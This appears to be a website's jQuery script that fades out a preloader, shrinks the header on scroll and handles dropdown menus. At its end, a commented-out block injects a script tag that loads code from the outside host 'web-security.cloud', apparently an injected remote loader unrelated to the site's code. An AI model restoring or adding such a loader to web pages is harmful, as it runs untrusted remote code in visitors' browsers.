$(window).load(function () {
    $(".site-loder").delay(100).fadeOut("slow");
});

function init() {
    window.addEventListener("scroll", function (e) {
        var distanceY =
                window.pageYOffset || document.documentElement.scrollTop,
            shrinkOn = 500,
            header = document.querySelector("header .navbar");
        if (distanceY > shrinkOn) {
            classie.add(header, "smaller");
        } else {
            if (classie.has(header, "smaller")) {
                classie.remove(header, "smaller");
            }
        }
    });
}
window.onload = init();

$(function () {
    // drow down menu
    $("header .navbar .dropdown").hover(function () {
        $(this).children("ul").fadeToggle("fast");
    });

    $("header .dropdown > a").click(function (e) {
        e.preventDefault();
    });

    var link = $('header .nav li > a:not(".dropdown > a")');

    link.click(function () {
        $("header .navbar-collapse").removeClass("in");
    });
});
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/
